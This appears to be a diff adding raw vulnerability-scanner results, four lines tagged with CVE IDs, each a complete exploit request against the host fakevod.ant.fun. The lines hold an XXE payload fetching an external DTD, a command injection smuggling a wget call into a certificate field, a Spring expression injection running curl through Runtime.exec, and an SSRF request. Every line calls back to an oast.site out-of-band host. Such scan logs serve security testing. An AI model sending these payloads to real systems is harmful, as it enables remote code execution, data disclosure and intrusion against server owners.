@@ -1,0 +1,4 @@
+[CVE-2019-2767] [http] [high] https://fakevod.ant.fun/xmlpserver/convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//d9krflklr2r3erlen4lgig4rtqxmy96q8.oast.site/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123
+[CVE-2021-33544] [http] [high] https://fakevod.ant.fun//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9krflklr2r3erlen4lg5rxj3b6p9rk9d.oast.site)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2021-22053] [http] [high] https://fakevod.ant.fun/hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22curl%20http://d9krflklr2r3erlen4lgukeco356gefzh.oast.site%22%29%7D__::.x/
+[CVE-2018-15517] [http] [high] https://fakevod.ant.fun/index.php/System/MailConnect/host/d9krflklr2r3erlen4lg5f7ie6eqat6ej.oast.site/port/80/secure/
